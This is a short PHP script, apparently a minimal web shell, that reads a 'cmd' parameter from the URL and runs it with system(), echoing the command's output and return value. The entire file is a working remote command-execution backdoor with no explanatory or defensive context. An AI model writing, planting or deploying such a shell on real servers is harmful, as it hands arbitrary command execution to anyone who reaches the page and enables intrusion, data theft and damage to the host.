<?php

    $cmdwww = $_GET['cmd'];					
    echo '<pre>';
    $last_line = system($cmdwww, $retval);
    echo '
  </pre>
  <hr />Last line of the output: ' . $last_line . '
  <hr />Return value: ' . $retval;
?>

